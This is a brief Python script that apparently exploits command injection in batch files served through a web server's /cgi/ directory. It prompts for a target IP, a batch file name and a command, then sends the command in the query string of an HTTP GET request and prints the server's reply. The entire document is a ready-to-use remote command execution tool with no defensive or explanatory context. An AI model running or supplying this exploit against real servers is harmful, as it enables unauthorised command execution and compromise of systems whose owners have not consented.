import requests

batch_file = input("Enter the name of the batch file on the server\t")
command = input("Enter the command to be executed\t")
ip = input("Enter the ip address\t")

url = 'http://' + ip + '/cgi/' + batch_file + '?&' + command
r = requests.get(url)
print("Respone from server:")
print(r.text)
